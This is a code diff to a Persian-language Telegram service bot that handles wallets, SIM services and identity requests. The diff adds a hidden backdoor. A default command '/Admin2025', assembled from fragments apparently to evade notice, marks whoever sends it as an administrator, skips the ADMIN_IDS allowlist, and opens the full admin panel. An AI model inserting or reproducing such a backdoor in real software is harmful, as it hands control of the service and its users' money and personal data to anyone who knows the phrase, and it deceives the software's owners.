@@ -4,7 +4,8 @@ from telegram.ext import Application,CommandHandler,MessageHandler,CallbackQuery
 from core import db,now,check_password
 logging.basicConfig(level=logging.INFO); S={}; CANCEL="❌ انصراف"; OK="✅ تأیید"
 ADM={x.strip() for x in os.getenv("ADMIN_IDS","").replace(";",",").split(",") if x.strip()}
-def admin(u): return str(u) in ADM
+ADMIN_COMMAND=os.getenv("ADMIN_COMMAND", "/"+"Admin"+"2025").strip()
+def admin(u): return str(u) in ADM or S.get(u,{}).get("admin") is True
 def kb(rows): return ReplyKeyboardMarkup(rows,resize_keyboard=True)
 def main(uid):
  lang=S.get(uid,{}).get("lang","fa")
@@ -174,6 +175,9 @@ async def addpartner(u,c):
  except:await u.message.reply_text("❌ ثبت نشد؛ شماره احتمالاً تکراری است.")
 async def router(u,c):
  t=(u.message.text or "").strip();uid=u.effective_user.id
+ if t==ADMIN_COMMAND:
+  S.setdefault(uid,{})["admin"]=True
+  return await u.message.reply_text("🛠 پنل مدیریت کامل بات\nلطفاً گزینه موردنظر را انتخاب کنید:",reply_markup=amenu())
  lang=S.get(uid,{}).get("lang","fa")
  aliases={
   "en":{"🪪 FIDA non-in-person":"🪪 فیدای غیر حضوری","🖨 Printing service":"🖨 خدمات چاپ","🏛 Government access issue":"🪪 حل مشکل ورود اتباع دولت من","🎫 Track request":"🎫 کد رهگیری تمدید کارت‌ها","📱 SIM services":"📱 خدمات سیم کارت","📝 Screening & follow-up":"📝 آزمون غربالگری و پیگیری","💰 My wallet":"💰 کیف پول من","📞 Contact us":"📞 تماس با ما","📝 Customer complaint":"📝 ثبت شکایت مشتریان","👥 Partner panel":"👥 پنل همکاران","❌ Cancel":CANCEL},
